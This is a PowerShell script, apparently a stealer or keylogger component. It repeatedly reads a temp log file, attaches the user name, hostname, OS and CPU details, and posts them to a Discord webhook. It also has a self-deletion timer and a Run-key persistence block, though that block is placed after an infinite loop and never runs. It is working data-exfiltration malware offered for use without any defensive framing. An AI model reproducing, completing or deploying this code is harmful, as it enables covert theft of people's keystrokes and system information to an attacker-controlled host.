# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $dc is the variable passed via the command line

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Define the expiry date passed as an argument (in 'yyyy-MM-dd' format)
$expiryDate = [datetime]::ParseExact($args[0], 'yyyy-MM-dd', $null)  # Expiry date passed in 'yyyy-MM-dd' format

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Get additional system info
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
$cpuInfo = Get-WmiObject -Class Win32_Processor
$userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$hostname = $env:COMPUTERNAME

# Start an infinite loop to check the file every 5 seconds
while ($true) {
    # Pause for 5 seconds before checking
    Start-Sleep -Seconds 10

    # Check if the temp log file exists
    if (Test-Path $tempFilePath) {
        # Read the content of the log file
        $logContent = Get-Content $tempFilePath -Raw

        # Check if the log file has content
        if ($logContent) {
            # Get the current timestamp
            $timestamp = Get-Date -Format 'dd-MM-yyyy HH:mm:ss'

            # Create the message to send (content only as a string)
            $message = "$timestamp - $logContent`n`nSystem Information:`nOS: $($osInfo.Caption)`nCPU: $($cpuInfo.Name)`nUser: $userInfo`nHostname: $hostname"

            # Debugging: Print the message to ensure it's properly formatted
            Write-Host "Message to send:" -ForegroundColor Cyan
            Write-Host $message

            # Try to send the message to the Discord webhook
            try {
                # Send the content as a plain string
                $jsonPayload = @{ content = $message } | ConvertTo-Json
                $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'application/json' -Body $jsonPayload
                Write-Host "Response from Discord:" -ForegroundColor Green
                Write-Host $response
            }
            catch {
                # Print detailed error message
                Write-Host "Error while sending message to webhook:" -ForegroundColor Red
                Write-Host $_.Exception.Message
            }

            # Clear the content of the temp log file after sending the data
            Clear-Content $tempFilePath
        }
        else {
            Write-Host "No content in log file" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "Temp file not found at path: $tempFilePath" -ForegroundColor Yellow
    }
}

# Add this script to startup to ensure it runs every time the system boots
$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "MyStartupScript"  # You can change this name if you like

# Check if the script is already added to startup to avoid duplicates
$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
if ($existingEntry) {
    Write-Host "Script is already added to startup."
} else {
    # Add the script to startup
    Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
    Write-Host "Script added to startup."
}
